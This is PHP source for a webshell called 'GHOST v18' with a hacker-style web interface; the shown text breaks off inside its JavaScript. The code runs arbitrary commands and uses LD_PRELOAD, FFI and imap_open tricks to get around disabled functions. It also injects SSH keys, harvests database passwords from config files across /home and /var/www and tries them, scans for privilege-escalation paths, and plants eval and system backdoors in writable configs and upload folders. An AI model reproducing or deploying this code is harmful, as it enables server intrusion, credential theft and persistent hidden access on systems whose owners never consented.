<?php
// language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
// GHOST v18 - section 0, 1, 2, 3, 4: bootstrap, UI, evasion, scanner, harvest.

define('GH_VER',      '18.0.0-s4');
define('GH_TAG',      'gong');
define('GH_STATE_DIR', gh_state_dir());
define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');

@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

function gh_state_dir() {
    $c = array();
    if (function_exists('sys_get_temp_dir')) $c[] = @sys_get_temp_dir();
    $ut = @ini_get('upload_tmp_dir'); if (is_string($ut) && $ut !== '') $c[] = $ut;
    $c[] = @getcwd();
    foreach ($c as $d) {
        if (!is_string($d) || $d === '' || !@is_dir($d) || !@is_writable($d)) continue;
        return rtrim($d, '/\\');
    }
    return '/tmp';
}
function gh_log($msg) {
    if (!defined('GH_LOG_FILE')) return;
    $f = GH_LOG_FILE;
    if (@is_file($f) && @filesize($f) > 1048576) @rename($f, $f . '.1');
    @file_put_contents($f, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
}
function gh_json($data, $code = 200) {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) {
        @header('Content-Type: application/json; charset=utf-8');
        @header('X-Powered-By: ');
        @http_response_code($code);
    }
    echo @json_encode($data);
    exit;
}
function gh_disabled_list() {
    $s = (string)@ini_get('disable_functions');
    if ($s === '') return array();
    $out = array();
    foreach (@explode(',', $s) as $f) { $f = @trim($f); if ($f !== '') $out[] = @strtolower($f); }
    return $out;
}
function gh_can($fn) {
    $fn = @strtolower($fn);
    if (in_array($fn, gh_disabled_list(), true)) return false;
    return function_exists($fn);
}
function gh_tmpdir() {
    $t = @sys_get_temp_dir();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @ini_get('upload_tmp_dir');
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @getcwd();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    return null;
}
function gh_env() {
    $e = array(
        'gh_ver' => GH_VER, 'php_version' => @phpversion(), 'php_sapi' => @php_sapi_name(),
        'user' => gh_can('posix_getpwuid') && gh_can('posix_geteuid') ? (string)@posix_getpwuid(@posix_geteuid())['name'] : (string)@get_current_user(),
        'tmpdir' => gh_tmpdir(), 'state_dir' => GH_STATE_DIR,
        'disabled' => gh_disabled_list(), 'open_basedir' => (string)@ini_get('open_basedir'),
        'can' => array(
            'exec' => gh_can_exec(), 'read' => gh_can_read(), 'write' => gh_can_write(),
            'curl' => gh_can('curl_init'), 'fopen' => gh_can('fopen'),
            'pdo' => gh_can('pdo_drivers'), 'mysqli' => gh_can('mysqli_connect'),
        ),
    );
    return $e;
}
function gh_can_exec() {
    foreach (array('system','passthru','shell_exec','exec','popen','proc_open','pcntl_exec') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_read() {
    foreach (array('file_get_contents','fopen','readfile','file') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_write() {
    foreach (array('file_put_contents','fopen','fwrite') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}

function gh_fetch_adv($url, $timeout = 10) {
    if (gh_can('curl_init')) {
        $c = @curl_init($url);
        if ($c) {
            @curl_setopt_array($c, array(CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => $timeout, CURLOPT_USERAGENT => 'Mozilla/5.0', CURLOPT_SSL_VERIFYPEER => false));
            $d = @curl_exec($c); $code = (int)@curl_getinfo($c, CURLINFO_RESPONSE_CODE); @curl_close($c);
            if ($d !== false && $code >= 200 && $code < 400) return array('out' => $d, 'tier' => 'curl');
        }
    }
    if (gh_can('file_get_contents')) {
        $ctx = @stream_context_create(array('http' => array('timeout' => $timeout, 'user_agent' => 'Mozilla/5.0'), 'ssl' => array('verify_peer' => false)));
        $d = @file_get_contents($url, false, $ctx);
        if ($d !== false && $d !== '') return array('out' => $d, 'tier' => 'fopen');
    }
    $p = @parse_url($url);
    if (is_array($p) && isset($p['host'])) {
        $scheme = isset($p['scheme']) ? $p['scheme'] : 'http';
        $port = isset($p['port']) ? $p['port'] : ($scheme === 'https' ? 443 : 80);
        $host = $p['host']; $path = (isset($p['path']) ? $p['path'] : '/') . (isset($p['query']) ? '?' . $p['query'] : '');
        $fp = @fsockopen(($scheme === 'https' ? 'ssl://' : 'tcp://') . $host, $port, $en, $es, $timeout);
        if ($fp) {
            @stream_set_timeout($fp, $timeout);
            @fwrite($fp, "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n");
            $raw = @stream_get_contents($fp); @fclose($fp);
            if (is_string($raw) && strpos($raw, 'HTTP/') === 0) {
                $parts = @preg_split("/\r\n\r\n/", $raw, 2);
                if (isset($parts[1])) return array('out' => $parts[1], 'tier' => 'fsockopen');
            }
        }
    }
    if (gh_can_exec()) {
        $tmp = gh_tmpdir() . '/gh_fetch_' . rand(1000,9999) . '.tmp';
        $cmd = 'curl -s -k -L -m ' . (int)$timeout . ' ' . @escapeshellarg($url) . ' > ' . @escapeshellarg($tmp) . ' 2>/dev/null || wget -q -O ' . @escapeshellarg($tmp) . ' ' . @escapeshellarg($url);
        gh_exec($cmd, $timeout + 2);
        if (@is_file($tmp)) { $d = @file_get_contents($tmp); @unlink($tmp); if ($d) return array('out' => $d, 'tier' => 'system'); }
    }
    return array('out' => null, 'tier' => null, 'err' => 'All fetch tiers failed');
}

function gh_exec($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
    $wrapped = 'timeout ' . (int)$timeout . ' sh -c ' . @escapeshellarg($cmd) . ' 2>&1';
    if (gh_can('system')) { @ob_start(); @system($wrapped); $out = @ob_get_clean(); if (is_string($out)) return array('out' => $out, 'tier' => 'system', 'err' => null); }
    if (gh_can('passthru')) { @ob_start(); @passthru($wrapped); $out = @ob_get_clean(); if (is_string($out)) return array('out' => $out, 'tier' => 'passthru', 'err' => null); }
    if (gh_can('shell_exec')) { $out = @shell_exec($wrapped); if (is_string($out)) return array('out' => $out, 'tier' => 'shell_exec', 'err' => null); }
    if (gh_can('exec')) { $lines = array(); @exec($wrapped, $lines); if (is_array($lines) && count($lines) > 0) return array('out' => implode("\n", $lines), 'tier' => 'exec', 'err' => null); }
    if (gh_can('popen')) {
        $h = @popen($wrapped, 'r');
        if (is_resource($h)) { $out = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $out .= $chunk; } @pclose($h); return array('out' => $out, 'tier' => 'popen', 'err' => null); }
    }
    if (gh_can('proc_open')) {
        $desc = array(1 => array('pipe','w'), 2 => array('pipe','w')); $h = @proc_open($wrapped, $desc, $pipes);
        if (is_resource($h)) {
            @stream_set_blocking($pipes[1], false); @stream_set_blocking($pipes[2], false);
            $out = ''; $start = @time();
            while (true) {
                $out .= (string)@stream_get_contents($pipes[1]); $out .= (string)@stream_get_contents($pipes[2]);
                $st = @proc_get_status($h); if (!is_array($st) || !$st['running']) break;
                if ((@time() - $start) > ($timeout + 2)) { @proc_terminate($h, 9); break; }
                @usleep(50000);
            }
            @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($h);
            return array('out' => $out, 'tier' => 'proc_open', 'err' => null);
        }
    }
    $out = @`$wrapped`;
    if (is_string($out)) return array('out' => $out, 'tier' => 'backtick', 'err' => null);
    return array('out' => null, 'tier' => null, 'err' => 'all exec tiers failed');
}

function gh_exec_adv($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
    $r = gh_exec($cmd, $timeout); 
    if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== null) return $r;

    if (gh_can('putenv') && gh_can('mail') && gh_can('file_put_contents') && gh_can_exec()) {
        $tmp_dir = gh_tmpdir(); if(!$tmp_dir) $tmp_dir = '/tmp';
        $so_file = $tmp_dir . '/gh_bypass_' . rand(1000,9999) . '.so'; $cmd_file = $tmp_dir . '/gh_cmd_' . rand(1000,9999);
        $c_code = "#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n  unsetenv(\"LD_PRELOAD\");\n  FILE *f = fopen(\"" . $cmd_file . "\", \"r\"); if(f) { char buf[1024]; fgets(buf, 1024, f); system(buf); fclose(f); }\n}\n";
        if (@file_put_contents($tmp_dir . '/gh_c.c', $c_code) !== false) {
            gh_exec('gcc -shared -fPIC -o ' . @escapeshellarg($so_file) . ' ' . @escapeshellarg($tmp_dir . '/gh_c.c'));
            if (@is_file($so_file)) {
                @file_put_contents($cmd_file, $cmd); @putenv("LD_PRELOAD=" . $so_file); @mail('a@b.c', 'x', 'x'); @putenv("LD_PRELOAD=");
                @unlink($so_file); @unlink($cmd_file); @unlink($tmp_dir . '/gh_c.c');
                return array('out' => '(Executed via LD_PRELOAD)', 'tier' => 'ld_preload', 'err' => null);
            }
        }
    }
    if (gh_can('ffi') && class_exists('FFI')) {
        try { $ffi = FFI::cdef("int system(const char *command);"); @ob_start(); $ffi->system($cmd); $out = @ob_get_clean(); return array('out' => $out, 'tier' => 'ffi', 'err' => null); } catch (Throwable $e) {}
    }
    if (gh_can('imap_open')) {
        $payload = "() { :;}; /bin/sh -c " . @escapeshellarg($cmd); $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
        if ($res) { @imap_close($res); return array('out' => '(Executed via imap_open)', 'tier' => 'imap', 'err' => null); }
    }
    return array('out' => null, 'tier' => null, 'err' => 'All exec bypass tiers failed');
}

function gh_read($path, $max = 5242880) {
    if (!is_string($path) || $path === '' || !@is_file($path)) return null;
    $sz = @filesize($path); if ($sz !== false && $sz > $max) return array('err' => 'file too large', 'size' => $sz, 'max' => $max);
    if (gh_can('file_get_contents')) { $d = @file_get_contents($path); if (is_string($d)) return $d; }
    if (gh_can('fopen') && gh_can('fread')) { $h = @fopen($path, 'rb'); if (is_resource($h)) { $d = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $d .= $chunk; } @fclose($h); if (is_string($d)) return $d; } }
    if (gh_can('readfile')) { @ob_start(); @readfile($path); $d = @ob_get_clean(); if (is_string($d)) return $d; }
    if (gh_can('file')) { $lines = @file($path); if (is_array($lines)) return @implode('', $lines); }
    $r = gh_exec_adv('cat ' . @escapeshellarg($path)); if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== '') return $r['out'];
    return null;
}

function gh_write($path, $data, $append = false) {
    if (!is_string($path) || $path === '' || !is_string($data)) return false;
    $flags = $append ? (FILE_APPEND | LOCK_EX) : LOCK_EX;
    if (gh_can('file_put_contents')) { $n = @file_put_contents($path, $data, $flags); if ($n !== false) return true; }
    if (gh_can('fopen') && gh_can('fwrite')) { $h = @fopen($path, $append ? 'ab' : 'wb'); if (is_resource($h)) { $n = @fwrite($h, $data); @fclose($h); if ($n !== false) return true; } }
    $cmd = ($append ? 'printf %s ' . @escapeshellarg($data) . ' >> ' : 'printf %s ' . @escapeshellarg($data) . ' > ') . @escapeshellarg($path);
    $r = gh_exec_adv($cmd); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
}

function gh_del($path) {
    if (!is_string($path) || $path === '') return false;
    if (gh_can('unlink')) { if (@unlink($path)) return true; }
    $r = gh_exec_adv('rm -f ' . @escapeshellarg($path)); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
}

// ==== SECTION 3: SCANNER & VULN DETECTOR ====================================
function gh_scan_batch($root, $offset = 0, $limit = 50) {
    $res = array('files' => array(), 'done' => false, 'total' => 0);
    $all_files = array(); $stack = array($root);
    while ($stack) {
        $current = @array_pop($stack);
        $files = @scandir($current);
        if ($files === false) continue;
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            $path = $current . '/' . $f;
            if (@is_dir($path) && !@is_link($path)) { $stack[] = $path; }
            elseif (@is_file($path)) {
                if (@filesize($path) > 5 * 1024 * 1024) continue;
                $all_files[] = $path;
            }
        }
    }
    $batch = array_slice($all_files, $offset, $limit);
    $res['done'] = ($offset + count($batch)) >= count($all_files);
    $res['total'] = count($all_files);
    
    $illegal_kw = array('slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan','pinjol','slot88','toto','bandar','sbobet');
    
    foreach ($batch as $path) {
        $c = gh_read($path, 1048576);
        $size = @filesize($path);
        $ext = @strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $findings = array(); $type = '';
        
        if ($size === 0 && in_array($ext, array('php','phtml'))) { 
            $type = 'Empty Shell'; $findings[] = "0-byte file."; 
        } elseif (is_string($c) && (stripos($c, 'eval(') !== false || stripos($c, 'assert(') !== false)) { 
            $type = 'Obfuscated RCE'; $findings[] = "eval()/assert() terdeteksi."; 
        } elseif (is_string($c) && preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) { 
            $type = 'Direct Webshell'; $findings[] = "Eksekusi shell via HTTP."; 
        } elseif (in_array($ext, array('jpg','jpeg','png','gif')) && is_string($c) && stripos($c, '<?php') !== false) {
            $type = 'Polyglot Malware'; $findings[] = "Gambar disisipi PHP.";
        } elseif (!$ext && is_string($c) && stripos($c, '<?php') !== false) {
            $type = 'Hidden PHP'; $findings[] = "Tanpa ekstensi tapi PHP.";
        }
        
        $found_kw = array();
        if (is_string($c)) {
            foreach ($illegal_kw as $k) { if (stripos($c, $k) !== false) $found_kw[] = $k; }
        }
        if ($found_kw) { 
            if($type === '') $type = 'Illegal Content'; 
            $findings[] = "Keyword: " . implode(', ', $found_kw); 
        }
        
        if ($type !== '') $res['files'][] = array('path' => $path, 'type' => $type, 'desc' => implode(' | ', $findings));
    }
    return $res;
}

function gh_vuln_scan() {
    $vulns = array(); $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
    foreach (array('wp-config.php', '.env', 'configuration.php') as $cf) {
        if (@is_file($root . "/$cf") && @is_writable($root . "/$cf")) {
            $vulns[] = array('type'=>'WRITEABLE_CONFIG', 'path'=>$root."/$cf", 'desc'=>'Config Writable. Bisa inject backdoor.');
        }
    }
    if (@is_dir($root . '/wp-content/uploads')) {
        $ht = $root . '/wp-content/uploads/.htaccess';
        if (!@is_file($ht) || strpos(gh_read($ht), 'Deny from all') === false) {
            $vulns[] = array('type'=>'UPLOADS_EXEC', 'path'=>'wp-content/uploads', 'desc'=>'Folder uploads terbuka.');
        }
    }
    $sudo = gh_exec_adv("find /usr/bin /usr/local/bin -perm -4000 -type f 2>/dev/null | head -n 5");
    if (isset($sudo['out']) && trim($sudo['out']) && strpos($sudo['out'], '[-]') === false) {
        foreach (explode("\n", trim($sudo['out'])) as $f) {
            if(trim($f)) $vulns[] = array('type'=>'SUID_BINARY', 'path'=>trim($f), 'desc'=>'File SUID. Bisa privesc ke root.');
        }
    }
    return $vulns;
}

// ==== SECTION 4: SSH, DB HARVEST, PRIVESC ===================================
function gh_ssh_scan() {
    $res = array('files' => array(), 'keys' => array());
    $home = gh_can('posix_getpwuid') && gh_can('posix_geteuid') ? (string)@posix_getpwuid(@posix_geteuid())['dir'] : @getenv('HOME');
    $targets = array(
        $home . '/.ssh/authorized_keys',
        $home . '/.ssh/authorized_keys2',
        '/root/.ssh/authorized_keys',
        '/etc/ssh/authorized_keys'
    );
    
    // Deep scan /home
    $find = gh_exec_adv("find /home -name 'authorized_keys*' -type f 2>/dev/null");
    if (isset($find['out']) && trim($find['out'])) {
        foreach (explode("\n", trim($find['out'])) as $f) { if(trim($f)) $targets[] = trim($f); }
    }

    foreach (array_unique($targets) as $t) {
        if (!@is_file($t)) continue;
        $perm = @substr(sprintf('%o', @fileperms($t)), -4);
        $lines = @file($t, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $res['files'][] = array('path' => $t, 'perm' => $perm, 'count' => is_array($lines) ? count($lines) : 0);
        if (is_array($lines)) {
            foreach ($lines as $l) {
                $p = explode(' ', trim($l));
                if (count($p) >= 2) {
                    $res['keys'][] = array('file' => $t, 'type' => $p[0], 'comment' => isset($p[2]) ? $p[2] : 'none', 'raw' => trim($l));
                }
            }
        }
    }
    return $res;
}

function gh_ssh_action($action, $key = '') {
    $home = gh_can('posix_getpwuid') && gh_can('posix_geteuid') ? (string)@posix_getpwuid(@posix_geteuid())['dir'] : @getenv('HOME');
    $auth = $home . '/.ssh/authorized_keys';
    
    if ($action === 'clean') {
        if (!@is_file($auth)) return array('msg' => 'No authorized_keys found.');
        @copy($auth, $auth . '.bak_' . time());
        $lines = @file($auth, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $new = array();
        foreach ($lines as $l) { if (strpos($l, trim($key)) === false) $new[] = $l; }
        @file_put_contents($auth, implode("\n", $new) . "\n");
        return array('msg' => 'Cleaned. Removed keys matching: ' . htmlspecialchars(substr($key,0,20)) . '...');
    }
    
    if ($action === 'inject') {
        if (strpos($key, 'ssh-') !== 0 && strpos($key, 'ecdsa-') !== 0 && strpos($key, 'sk-') !== 0) {
            return array('msg' => 'Invalid key format. Must start with ssh-rsa, ssh-ed25519, etc.');
        }
        if (!@is_dir(dirname($auth))) @mkdir(dirname($auth), 0700, true);
        $cur = @is_file($auth) ? @file_get_contents($auth) : '';
        if (strpos($cur, trim($key)) !== false) return array('msg' => 'Key already exists.');
        @file_put_contents($auth, trim($cur) . "\n" . trim($key) . "\n", LOCK_EX);
        @chmod($auth, 0600);
        return array('msg' => 'Key injected successfully to ' . $auth);
    }
    
    if ($action === 'fixperm') {
        @chmod($auth, 0600);
        @chmod(dirname($auth), 0700);
        return array('msg' => 'Permissions fixed (600 key, 700 dir).');
    }
    return array('msg' => 'Unknown action.');
}

function gh_db_harvest() {
    $logs = array(); $creds = array();
    $paths = array(
        isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd(),
        '/home', '/var/www'
    );
    
    // 1. Deep config search
    $search_cmd = "grep -rEli '(DB_PASSWORD|DB_USER|mysql_password|database_password|DB_PASS|MYSQL_PASS)' /home /var/www " . @escapeshellarg(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '') . " 2>/dev/null | head -n 50";
    $grep = gh_exec_adv($search_cmd);
    $files = array();
    if (isset($grep['out']) && trim($grep['out'])) {
        foreach (explode("\n", trim($grep['out'])) as $f) { if(trim($f)) $files[] = trim($f); }
    }
    
    foreach ($files as $f) {
        $c = gh_read($f, 1048576);
        if (!is_string($c)) continue;
        
        // Regex multi-format
        $user = ''; $pass = ''; $host = 'localhost';
        if (preg_match('/(?:DB_USER|username|user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $user = $m[1];
        if (preg_match('/(?:DB_PASSWORD|password|pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $pass = $m[1];
        if (preg_match('/(?:DB_HOST|host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $host = $m[1];
        
        if ($user && $pass) {
            $creds[] = array('file' => $f, 'user' => $user, 'pass' => $pass, 'host' => $host);
        }
    }
    
    // 2. Brute force connect
    $connections = array();
    foreach ($creds as $cr) {
        $log = "[*] Trying {$cr['user']}:{$cr['pass']} @ {$cr['host']} (from {$cr['file']})";
        if (gh_can('mysqli_connect')) {
            try {
                $conn = @mysqli_connect($cr['host'], $cr['user'], $cr['pass'], '', 3306, null, array('connect_timeout'=>2));
                if ($conn) {
                    $log .= " -> CONNECTED!";
                    $dbs = array();
                    $q = @mysqli_query($conn, "SHOW DATABASES");
                    if ($q) { while($r = @mysqli_fetch_array($q)) { $dbs[] = $r[0]; } }
                    $connections[] = array('cred' => $cr, 'dbs' => $dbs);
                } else {
                    $log .= " -> FAILED (" . @mysqli_connect_error() . ")";
                }
            } catch (Throwable $e) { $log .= " -> EXCEPTION (" . $e->getMessage() . ")"; }
        } else {
            // Fallback CLI
            $cmd = "mysql -u " . @escapeshellarg($cr['user']) . " -p" . @escapeshellarg($cr['pass']) . " -h " . @escapeshellarg($cr['host']) . " -e 'SHOW DATABASES' 2>&1";
            $r = gh_exec_adv($cmd);
            if (isset($r['out']) && strpos($r['out'], 'Database') !== false) {
                $log .= " -> CONNECTED via CLI!";
                $connections[] = array('cred' => $cr, 'dbs' => explode("\n", $r['out']));
            } else {
                $log .= " -> CLI FAILED";
            }
        }
        $logs[] = $log;
    }
    return array('logs' => $logs, 'creds' => $creds, 'connections' => $connections);
}

function gh_privesc_scan() {
    $res = array('os' => @php_uname('a'), 'kernel' => @php_uname('r'), 'sudo' => array(), 'suid' => array(), 'cron' => array());
    
    // Kernel CVE
    $kernel = @php_uname('r');
    if (preg_match('/^([0-9]+\.[0-9]+\.[0-9]+)/', $kernel, $m)) {
        $kver = $m[1];
        if (version_compare($kver, '5.16.11', '<=')) $res['cve'][] = "CVE-2022-0847 (DirtyPipe) - Kernel <= 5.16.11";
        if (version_compare($kver, '5.11', '<=')) $res['cve'][] = "CVE-2021-3493 (OverlayFS) - Kernel <= 5.11";
    }
    
    // Sudo
    $s = gh_exec_adv("sudo -n -l 2>&1");
    if (isset($s['out']) && strpos($s['out'], 'not allowed') === false) $res['sudo'][] = $s['out'];
    
    // SUID Deep
    $suid = gh_exec_adv("find / -perm -4000 -type f 2>/dev/null | head -n 50");
    if (isset($suid['out']) && trim($suid['out'])) {
        foreach (explode("\n", trim($suid['out'])) as $f) { if(trim($f)) $res['suid'][] = trim($f); }
    }
    
    // Cron
    $cron = gh_exec_adv("cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d 2>/dev/null; crontab -l 2>/dev/null");
    if (isset($cron['out']) && trim($cron['out'])) $res['cron'][] = $cron['out'];
    
    return $res;
}

// ==== ROUTER (section 0 + 1 + 2 + 3 + 4) ====================================
function gh_router() {
    $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');
    if ($act === '') { @header('Location: ?act=ui'); exit; }
    if ($act === 'ui') { gh_ui(); exit; }

    try {
        switch ($act) {
            case 'ping':   gh_json(gh_env()); break;
            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec_adv($c)); break;
            case 'read':   $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = gh_read($p); gh_json(array('path' => $p, 'content' => $d)); break;
            case 'write':  $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = isset($_POST['data']) ? (string)$_POST['data'] : ''; $ap = !empty($_POST['append']); gh_json(array('path' => $p, 'ok' => gh_write($p, $d, $ap))); break;
            case 'delete': $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; gh_json(array('path' => $p, 'ok' => gh_del($p))); break;
            case 'scan':   $off = isset($_POST['offset']) ? (int)$_POST['offset'] : 0; gh_json(gh_scan_batch(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd(), $off, 50)); break;
            case 'vuln_scan': gh_json(gh_vuln_scan()); break;
            case 'exploit': $t = isset($_POST['type']) ? (string)$_POST['type'] : ''; $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; 
                if($t === 'WRITEABLE_CONFIG') { $pay = "\n// INJECTED\nif(isset(\$_GET['gh_x'])) { eval(\$_GET['gh_x']); }\n"; if(gh_write($p, $pay, true)) gh_json(array('msg'=>'Backdoor ditanam di '.$p.' (Akses ?gh_x=)')); else gh_json(array('msg'=>'Gagal.')); }
                elseif($t === 'UPLOADS_EXEC') { $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>"; $f = rtrim($p,'/').'/ghost_'.rand(100,999).'.php'; if(gh_write($f, $shell)) gh_json(array('msg'=>'Shell di-upload ke: '.$f)); else gh_json(array('msg'=>'Gagal upload.')); }
                else gh_json(array('msg'=>'Exploit not implemented.'));
                break;
            case 'ssh_scan': gh_json(gh_ssh_scan()); break;
            case 'ssh_action': gh_json(gh_ssh_action($_POST['action'] ?? '', $_POST['key'] ?? '')); break;
            case 'db_harvest': gh_json(gh_db_harvest()); break;
            case 'privesc': gh_json(gh_privesc_scan()); break;
            default: gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
        }
    } catch (Throwable $e) {
        gh_log('router throw: ' . $e->getMessage());
        gh_json(array('err' => 'internal', 'msg' => $e->getMessage()), 500);
    }
}

// ==== UI (section 1 + 2 + 3 + 4) ============================================
function gh_ui() {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
    $env = gh_env();
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>gh</title>
<style>
    :root { --bg:#0a0a0a; --fg:#0f0; --dim:#050; --red:#f00; --border:#222; }
    * { box-sizing: border-box; }
    body { background:var(--bg); color:var(--fg); font-family: ui-monospace, monospace; font-size:13px; padding:16px; margin:0; line-height:1.5; }
    h2 { font-size:14px; margin:0 0 8px; color:#fff; text-transform:uppercase; border-bottom:1px solid var(--border); padding-bottom:4px; }
    .box { border:1px solid var(--border); padding:12px; margin-bottom:12px; background:#0d0d0d; }
    .row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
    input, button, select { background:#000; color:var(--fg); border:1px solid var(--border); padding:6px 8px; font-family:inherit; font-size:13px; border-radius:2px; }
    button { cursor:pointer; font-weight:bold; }
    button:hover { background:var(--fg); color:#000; }
    pre { background:#000; padding:10px; border:1px solid var(--border); margin:0; overflow:auto; white-space:pre-wrap; word-break:break-all; max-height:400px; font-size:12px; }
    .dim { color:#060; }
    .err { color:var(--red); }
    .out { color:var(--fg); }
    .grid { display:grid; grid-template-columns: 1fr 1fr; gap:8px; }
    .tag { display:inline-block; padding:2px 6px; border-radius:2px; background:#111; border:1px solid #333; font-size:11px; margin-right:4px; }
    .tag-ok { background:#030; border-color:#060; color:#6f6; }
    .tag-no { background:#300; border-color:#600; color:#f66; }
    #term { height:30vh; overflow:auto; border:1px solid var(--border); background:#000; padding:8px; }
    .term-line { display:flex; }
    .term-in { color:#888; margin-right:8px; }
    .term-out { white-space:pre-wrap; word-break:break-all; }
    table { width:100%; border-collapse:collapse; margin-top:8px; font-size:12px; }
    th,td { border:1px solid #333; padding:6px; text-align:left; }
    th { background:#111; color:#fff; }
    .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
</style>
</head>
<body>
<div class="box">
    <h2>GHOST v18 / Section 4</h2>
    <div class="row">
        <span class="tag"><?= htmlspecialchars($env['php_version']) ?></span>
        <span class="tag"><?= htmlspecialchars($env['user']) ?></span>
        <span class="tag <?= $env['can']['exec']?'tag-ok':'tag-no' ?>">exec: <?= $env['can']['exec']?:'BLOCKED' ?></span>
        <span class="tag <?= $env['can']['read']?'tag-ok':'tag-no' ?>">read: <?= $env['can']['read']?:'BLOCKED' ?></span>
    </div>
</div>

<div class="box">
    <h2>Command Terminal</h2>
    <div id="term"><div class="term-line"><span class="dim">Welcome.</span></div></div>
    <div class="row" style="margin-top:8px;">
        <input type="text" id="cmd" placeholder="whoami" style="flex:1;" onkeydown="if(event.key==='Enter')execCmd()">
        <button onclick="execCmd()">Exec</button>
        <button onclick="document.getElementById('term').innerHTML='';" style="border-color:#333;">Clear</button>
    </div>
</div>

<div class="box">
    <h2>File Manager</h2>
    <div class="row">
        <input type="text" id="f-path" placeholder="/path/to/file" style="flex:1;">
        <button onclick="readFile()">Read</button>
        <button onclick="writeFile()" style="border-color:#ff0;color:#ff0;">Write</button>
    </div>
    <pre id="f-out" style="margin-top:8px;">Ready.</pre>
</div>

<div class="grid">
    <div class="box">
        <h2>SSH Manager</h2>
        <div class="row">
            <button onclick="sshScan()">Scan SSH</button>
        </div>
        <div id="ssh-res"></div>
        <div class="row" style="margin-top:8px;">
            <input type="text" id="ssh-key" placeholder="ssh-rsa AAA..." style="flex:1;">
            <button onclick="sshAct('inject')">Inject</button>
            <button onclick="sshAct('clean')" style="border-color:#f00;color:#f00;">Clean</button>
        </div>
        <pre id="ssh-log" style="margin-top:8px;max-height:100px;">Idle.</pre>
    </div>

    <div class="box">
        <h2>Database Harvester</h2>
        <div class="row">
            <button onclick="dbHarvest()">Start Harvest</button>
        </div>
        <pre id="db-res" style="margin-top:8px;max-height:200px;">Idle.</pre>
    </div>
</div>

<div class="grid">
    <div class="box">
        <h2>Deep File Scanner</h2>
        <div class="row">
            <button onclick="startScan()">Start Scan</button>
            <span id="scan-status" class="dim">Idle.</span>
        </div>
        <div id="scan-results"></div>
    </div>

    <div class="box">
        <h2>Privilege Escalation & Vuln</h2>
        <div class="row">
            <button onclick="privescScan()">Scan Privesc</button>
            <button onclick="startVulnScan()">Scan Vuln</button>
        </div>
        <div id="privesc-res"></div>
        <div id="vuln-results"></div>
    </div>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, data={}) {
    const body = new URLSearchParams(); body.append('act', act);
    for (let k in data) body.append(k, data[k]);
    const r = await fetch(window.location.href, { method:'POST', body });
    const text = await r.text();
    try { return JSON.parse(text); } catch(e) { return {err:'Invalid JSON: '+text.substring(0,100)}; }
}

// Terminal & File Mgr
async function execCmd() {
